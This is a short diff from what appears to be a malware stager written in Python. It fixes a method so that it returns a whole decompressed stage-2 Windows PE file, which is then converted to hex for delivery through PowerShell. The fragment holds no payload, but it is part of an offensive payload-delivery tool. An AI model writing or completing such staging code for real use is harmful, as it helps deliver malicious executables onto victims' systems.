@@ -15,7 +15,7 @@ class Stager:
         # Stage 2 is a gzip compressed PE file          
         compressed   =  base64.b64decode(self.b64)      # Base64 decode the archieve 
         decompressed = zlib.decompress(compressed,-15)  # Decompress the PE file
-        return decompressed[64]
+        return decompressed
 
     def gen_ps_line(self):
         stage2_hex = self.get_stage2().hex()            # Convert the stage 2 PE file from bytes to hex in order to pass it to powershell
